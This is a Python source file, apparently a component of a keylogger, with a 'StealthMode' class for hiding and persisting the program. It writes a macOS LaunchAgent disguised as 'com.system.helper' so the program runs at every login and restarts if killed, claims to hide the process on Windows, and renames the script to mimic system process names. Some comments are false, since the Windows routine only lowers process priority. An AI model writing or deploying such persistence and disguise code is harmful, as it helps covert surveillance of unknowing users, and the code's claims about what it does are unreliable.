import os
import sys
import platform
import subprocess

class StealthMode:
    @staticmethod
    def hide_process_macos():
        """
        Techniques to hide process on macOS
        """
        try:
            # Use launchd to hide process
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{sys.argv[0]}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>Hidden</key>
    <true/>
</dict>
</plist>'''
            
            # Create LaunchAgent
            launch_agent_path = os.path.expanduser('~/Library/LaunchAgents/com.system.helper.plist')
            with open(launch_agent_path, 'w') as f:
                f.write(plist_content)
            
            # Set permissions
            subprocess.run(['chmod', '600', launch_agent_path], check=True)
            
            print("Process hidden via LaunchAgent")
        except Exception as e:
            print(f"Error hiding process on macOS: {e}")
    
    @staticmethod
    def hide_process_windows():
        """
        Techniques to hide process on Windows
        Requires pywin32
        """
        try:
            import win32process
            import win32api
            import win32con
            
            # Get current process handle
            pid = win32api.GetCurrentProcessId()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            
            # Hide process from Task Manager
            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
            
            print("Process hidden on Windows")
        except ImportError:
            print("pywin32 not installed. Windows stealth features unavailable.")
        except Exception as e:
            print(f"Error hiding process on Windows: {e}")
    
    @staticmethod
    def ensure_persistence():
        """
        Ensure keylogger starts on system boot
        """
        system = platform.system()
        
        if system == 'Darwin':  # macOS
            StealthMode.hide_process_macos()
            # Add to LaunchAgents for persistence
        elif system == 'Windows':
            StealthMode.hide_process_windows()
            # Add to Windows Registry for persistence
        elif system == 'Linux':
            # Linux persistence mechanism
            pass
    
    @staticmethod
    def obfuscate_process_name():
        """
        Rename process to blend with system processes
        """
        try:
            # Rename process to look like a system process
            process_names = [
                'system_helper', 
                'com.apple.systemstarter', 
                'winhost', 
                'system_service'
            ]
            
            import random
            new_name = random.choice(process_names)
            
            # Platform-specific renaming
            if platform.system() == 'Darwin':
                subprocess.run(['mv', sys.argv[0], new_name], check=True)
            
            print(f"Process renamed to {new_name}")
        except Exception as e:
            print(f"Error obfuscating process name: {e}")

def main():
    # Demonstrate stealth techniques
    StealthMode.ensure_persistence()
    StealthMode.obfuscate_process_name()

if __name__ == "__main__":
    main() 